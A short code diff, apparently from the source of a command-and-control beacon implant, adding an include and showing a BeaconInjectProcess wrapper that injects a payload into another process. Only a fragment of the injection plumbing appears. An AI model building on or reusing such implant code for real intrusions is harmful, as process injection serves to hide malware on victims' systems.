@@ -7,6 +7,8 @@
 #include "settings.h"
 
 #include "spawn.h"
+
+#include "argument.h"
 #include "beacon.h"
 #include "identity.h"
 
@@ -910,6 +912,7 @@ void ProcThreadAttributeListDestroy(LPVOID lpAttributeList)
 	DeleteProcThreadAttributeList(lpAttributeList);
 	HeapFree(GetProcessHeap(), 0, lpAttributeList);
 }
+
 void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
 {
 	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
